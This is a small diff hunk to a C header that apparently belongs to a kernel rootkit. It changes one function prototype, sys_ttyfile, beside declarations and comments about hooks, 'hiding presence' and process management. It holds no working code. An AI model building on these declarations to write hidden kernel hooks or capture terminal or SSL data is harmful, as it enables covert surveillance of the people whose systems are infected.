@@ -123,7 +123,7 @@ struct kernel_syscalls {
 /** hooks, hiding presence and so */
 bool sys_init(void);
 void sys_deinit(void);
-char *sys_ttyfile(void);
+char *sys_ttyfile(bool);
 char *sys_sslfile(bool);
 
 /** pid,task management */
